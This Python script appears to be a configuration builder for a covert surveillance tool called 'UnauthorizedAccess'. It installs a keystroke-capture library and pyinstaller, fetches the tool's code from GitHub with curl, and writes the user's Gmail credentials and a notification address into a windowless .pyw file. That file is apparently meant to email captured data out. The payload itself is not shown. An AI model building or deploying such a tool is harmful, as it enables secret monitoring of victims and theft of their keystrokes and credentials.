import sys,platform
if platform.system() != "Windows":
    print("This Script is written for Windows only..")
    if sys.version_info[0] == 2: Terminate = raw_input("Please Press Enter to Exit..")
    if sys.version_info[0] >= 3: Terminate = input("Please Press Enter to Exit..")   
    exit()
if sys.version_info[0] == 2:
    print("Python3 must be installed for this script to work!!")
    Terminate = raw_input("Please Press Enter to Exit..")
    exit()
    
import os,socket,datetime

red = lambda text: '\033[0;31m' + text + '\033[0m'
green = lambda text: '\033[0;32m' + text + '\033[0m'

def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def GET_TIME_FORMATTED():
    time = str(datetime.datetime.now())
    timeformatted = ""
    for x in range(0,len(time)):
        if time[x] == " ":
            timeformatted += "--"
        elif time[x] == ":":
            timeformatted += "."
        else:
            timeformatted += time[x]
    return timeformatted

online = is_connected()
if online == True:
    os.system("python -m pip install --upgrade pip")
    os.system("pip install pynput")
    os.system("pip install pypiwin32")
    os.system("pip install pyinstaller")
    if os.path.isfile("UA.py") == False :
        os.system("curl https://raw.githubusercontent.com/minamagdyshehata/UnauthorizedAccess/master/UA.pyw -o UA.py")
    else:
        lines = open("UA.py").readlines()
        if len(lines)== 139:
            print(green(chr(10) + "The correct UA.py file was found" + chr(10)))
        else:
            print (red(chr(10) + "Corrupted UA.py file was found. The correct file will be downloaded.." + chr(10)))
            time_now = GET_TIME_FORMATTED()
            os.rename("UA.py",time_now + "CorruptedUA.py")
            os.system("curl https://raw.githubusercontent.com/minamagdyshehata/UnauthorizedAccess/master/UA.py -o UA.py")
else:
    print("Please check your Internet Connection then run this script again!")
    Terminate = input("Please Press Enter to Exit..")
    exit()
        
print(red(chr(10) + "ALL DATA YOU ARE ABOUT TO ENTER WONT BE CHECKED FOR MISTAKES..."))
print(red("PLEASE BE CARFUL..." + chr(10)))

GMAIL_LSA = input(green("Please enter your Gmail (configured to allow Less secure app access): "))
GMAIL_LSA_PASS = input(green("Please enter your Gmail password: "))
NOFITY_EMAIL = input (green("Please enter the Email address where notifications will be sent to: "))
TERMINATION_PASS = input(green("Please enter your termination password (case sensitive): "))
    
RAWUA = open("UA.py").readlines()
RAWUA[1] = "Configured = True" + "\n"
RAWUA[60] = "    email = "+ chr(34) + GMAIL_LSA + chr(34) + "\n"
RAWUA[61] = "    password = "+ chr(34) + GMAIL_LSA_PASS + chr(34 )+ "\n"
RAWUA[62] = "    send_to_email = "+ chr(34) + NOFITY_EMAIL + chr(34) + "\n"
RAWUA[100] = "        if auth=="+ chr(34) + TERMINATION_PASS + chr(34) + ":" + "\n"

Configured_UA=open("ConfiguredUA.pyw","w")
for x in range(0,len(RAWUA)):
    Configured_UA.write(RAWUA[x])
Configured_UA.close()
print(chr(10) + "UA.py is successfully configured as " + green("ConfiguredUA.pyw"))
Terminate = input(red(chr(10) + "Please Press Enter to Exit.."))
exit()
